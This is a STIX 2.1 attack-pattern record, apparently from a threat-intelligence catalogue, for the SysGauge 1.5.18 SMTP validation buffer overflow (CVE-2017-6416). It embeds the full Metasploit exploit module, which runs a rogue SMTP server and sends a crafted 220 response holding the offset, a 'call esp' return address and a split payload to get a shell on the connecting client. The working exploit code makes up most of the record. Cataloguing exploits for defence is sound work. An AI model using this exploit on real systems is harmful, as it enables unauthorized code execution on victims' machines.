{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bbf96795-f526-497e-a992-0c7335e8e807",
    "created": "2024-08-14T16:38:31.912427Z",
    "modified": "2024-08-14T16:38:31.91243Z",
    "name": "SysGauge SMTP Validation Buffer Overflow",
    "description": " This module will setup an SMTP server expecting a connection from SysGauge 1.5.18 via its SMTP server validation. The module sends a malicious response along in the 220 service ready response and exploits the client, resulting in an unprivileged shell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smtp/sysgauge_client_bof.rb",
            "external_id": "sysgauge_client_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6416"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::TcpServer\n\n  Rank = NormalRanking\n\n  def initialize()\n    super(\n      'Name'           => 'SysGauge SMTP Validation Buffer Overflow',\n      'Description'    => %q{\n        This module will setup an SMTP server expecting a connection from SysGauge 1.5.18\n        via its SMTP server validation. The module sends a malicious response along in the\n        220 service ready response and exploits the client, resulting in an unprivileged shell.\n      },\n      'Author'         =>\n      [\n        'Chris Higgins', # msf Module -- @ch1gg1ns\n        'Peter Baris'    # Initial discovery and PoC\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n      [\n        [ 'CVE', '2017-6416' ],\n        [ 'EDB', '41479' ],\n      ],\n      'DefaultOptions' =>\n      {\n        'EXITFUNC' => 'thread'\n      },\n      'Payload'        =>\n      {\n        'Space' => 306,\n        'BadChars' => \"\\x00\\x0a\\x0d\\x20\"\n      },\n      'Platform'  => 'win',\n      'Targets'       =>\n      [\n        [ 'Windows Universal',\n          {\n            'Offset' => 176,\n            'Ret'    => 0x6527635E # call esp # QtGui4.dll\n          }\n        ]\n      ],\n      'Privileged'    => false,\n      'DisclosureDate' => 'Feb 28 2017',\n      'DefaultTarget' => 0\n      )\n    register_options(\n      [\n      OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 25 ]),\n      ])\n  end\n\n  def on_client_connect(c)\n    # Note here that the payload must be split into two parts.\n    # The payload gets jumbled in the stack so we need to split\n    # and align to get it to execute correctly.\n    sploit =  \"220 \"\n    sploit << rand_text(target['Offset'])\n    # Can only use the last part starting from 232 bytes in\n    sploit << payload.encoded[232..-1]\n    sploit << rand_text(2)\n    sploit << [target.ret].pack('V')\n    sploit << rand_text(12)\n    sploit << make_nops(8)\n    # And the first part up to 232 bytes\n    sploit << payload.encoded[0..231]\n    sploit << \"ESMTP Sendmail \\r\\n\"\n\n    print_status(\"Client connected: \" + c.peerhost)\n    print_status(\"Sending payload...\")\n\n    c.put(sploit)\n  end\nend\n",
    "x_mitre_disclosure_date": "Feb 28 2017",
    "x_mitre_platforms": [
        "win'"
    ]
}